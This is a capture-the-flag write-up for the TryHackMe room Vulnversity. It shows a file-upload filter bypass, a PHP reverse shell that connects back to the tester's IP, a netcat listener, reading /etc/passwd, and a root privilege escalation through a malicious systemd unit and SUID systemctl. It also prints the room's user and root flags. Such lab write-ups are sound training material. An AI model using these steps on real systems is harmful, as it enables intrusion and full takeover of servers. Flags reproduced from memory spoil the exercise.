# TryHackMe — Vulnversity

**Difficulty:** Easy
**Category:** Web Application, Privilege Escalation
**Vulnerabilities:** File Upload Bypass, SUID Misconfiguration
**Tools Used:** Nmap, Scyfix Directory Scanner, Burp Suite Intruder, Netcat, Systemctl SUID
**Target OS:** Ubuntu Linux
**Result:** Root shell via SUID systemctl exploitation

---

## Room Overview

Vulnversity is a beginner-friendly Linux exploitation room on TryHackMe. The target runs a web server with a file upload form that has a weak extension filter. The goal is to bypass the filter, upload a PHP reverse shell, gain remote code execution, and escalate privileges to root using a SUID misconfiguration on systemctl.

---

## Methodology

### 1. Reconnaissance

Ran an Nmap scan to identify open ports and services:

```bash
nmap -sV 10.129.138.167
```

**Key findings:**
- Port 22 — SSH
- Port 3333 — Apache HTTP web server (non-standard port)
- OS: Ubuntu Linux

---

### 2. Directory Discovery

Used Scyfix Directory Scanner (custom tool) to find hidden directories on port 3333:

```bash
python3 dirscanner.py
# Target: http://10.129.138.167:3333
# Wordlist: /usr/share/dirb/wordlists/common.txt
```

**Finding:**
[301] REDIRECT: http://10.129.138.167:3333/internal --> /internal/


Navigating to `http://10.129.138.167:3333/internal/` revealed a file upload form.

---

### 3. Upload Filter Bypass

The upload form blocked certain file extensions. Used Burp Suite Intruder to fuzz the extension and find which PHP extension was allowed.

**Setup:**
- Captured the upload POST request in Burp Suite Proxy
- Sent to Intruder with Sniper attack type
- Marked the file extension as the payload position
- Added payload list: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`
- Disabled URL encoding in Payload Encoding settings (critical — dot was being encoded to `%2E` which broke all attempts)

**Result:** `.phtml` was accepted by the server — all other PHP extensions were blocked

**Key lesson:** Always disable URL encoding in Burp Intruder when fuzzing filenames — the dot in `.phtml` was being encoded to `%2Ephtml` which the server didn't recognise as a PHP extension.

---

### 4. Reverse Shell

Downloaded the pentestmonkey PHP reverse shell:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O php-reverse-shell.php
```

Edited the IP and port:
```php
$ip = '192.168.131.129';  // tun0 VPN IP
$port = 1234;
```

Renamed to bypass the filter:
```bash
mv php-reverse-shell.php php-reverse-shell.phtml
```

Started netcat listener:
```bash
nc -lvnp 1234
```

Uploaded `php-reverse-shell.phtml` through the browser, then triggered execution by navigating to:

http://10.129.138.167:3333/internal/uploads/php-reverse-shell.phtml


**Result:** Reverse shell received as `www-data`

Upgraded to a proper interactive shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

### 5. Post Exploitation — User Flag

Identified the system user:
```bash
cat /etc/passwd
# Found: bill:x:1000:1000:,,,:/home/bill:/bin/bash
```

Retrieved user flag:
```bash
cat /home/bill/user.txt
```

**User flag:** `8bd7992fbe96a6fe1d7f99e4e0540e6d`

---

### 6. Privilege Escalation — SUID

Searched for SUID files:
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Suspicious finding:**

/bin/systemctl


`systemctl` should never have the SUID bit set. With SUID, it runs as root regardless of who executes it.

**Exploit — malicious systemd service:**

First upgraded shell to bash for proper command handling:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Created a malicious service file that copies the root flag:
```bash
echo '[Service]' > /tmp/hack.service
echo 'Type=oneshot' >> /tmp/hack.service
echo 'ExecStart=/bin/sh -c "cp /root/root.txt /tmp/flag && chmod 777 /tmp/flag"' >> /tmp/hack.service
echo '[Install]' >> /tmp/hack.service
echo 'WantedBy=multi-user.target' >> /tmp/hack.service
```

Linked and started the service:
```bash
/bin/systemctl link /tmp/hack.service
/bin/systemctl start hack.service
```

Retrieved root flag:
```bash
cat /tmp/flag
```

**Root flag:** `a58ff8579f0a9270368d33a9966c7fd5`

---

## Key Takeaways

- Always scan for non-standard ports — the web server was on 3333, not 80
- File upload filters can be bypassed by trying alternative PHP extensions like `.phtml`
- Burp Intruder URL-encodes payloads by default — always disable this when fuzzing filenames
- SUID on service management tools like `systemctl` is a critical misconfiguration
- A basic reverse shell needs upgrading with `python3 pty` for reliable command execution
- Always check `/etc/passwd` for human users with `/bin/bash` shells — they hold the flags

---

## What I Learned

- How to identify and exploit file upload vulnerabilities
- How to use Burp Suite Intruder correctly including payload encoding settings
- How PHP reverse shells work and how to configure and deploy them
- How to identify SUID misconfigurations with `find`
- How to abuse SUID systemctl to execute commands as root
- How to upgrade a basic shell to a fully interactive bash session

---

## References

- [GTFOBins systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [Pentestmonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [TryHackMe Vulnversity Room](https://tryhackme.com/room/vulnversity)